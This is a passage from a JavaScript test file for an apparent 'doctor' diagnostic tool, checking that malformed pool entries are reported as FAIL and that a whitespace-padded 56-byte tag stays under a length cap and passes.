    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');

    const under = healthy('ccrc-doctor-pools-undercap-');
    pooledRoster(under);
    project(under, 'demo');
    tag(under, 'demo', `pool-a${' '.repeat(50)}`);
    const line = lineFor(runDoctor(under).stdout, 'pools');
    expect(line, 'a 56-byte tag is under the cap and strips to a legal name').toMatch(/^PASS pools: /);
  });
});
